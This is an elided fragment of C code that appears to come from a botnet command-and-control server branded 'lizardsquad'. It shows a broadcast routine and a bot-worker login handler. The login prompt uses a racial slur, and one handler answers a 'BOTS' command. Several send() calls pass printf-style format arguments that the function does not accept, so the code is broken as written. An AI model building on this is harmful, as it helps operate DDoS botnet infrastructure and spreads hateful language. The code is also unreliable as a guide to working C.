...
void broadcast(char *msg, int us, char *sender)
{
        ...
        for(i = 0; i < MAXFDS; i++)
        {
                ...
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[31m%s@lizardsquad: ", accounts[find_line].username, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
...
void *BotWorker(void *sock) {
    ...
    while(j!=i-1) {
        ...
        if(send(datafd, "\x1b[31mNiggername: \x1b[31m ", 24, MSG_NOSIGNAL) == -1) goto end;
		...
		while(fdgets(buf, sizeof buf, datafd) > 0)
		{
			if(strstr(buf, "BOTS")) {
				...
				if(send(datafd, "\x1b[31m%s@lizardsquad: ", accounts[find_line].username, MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
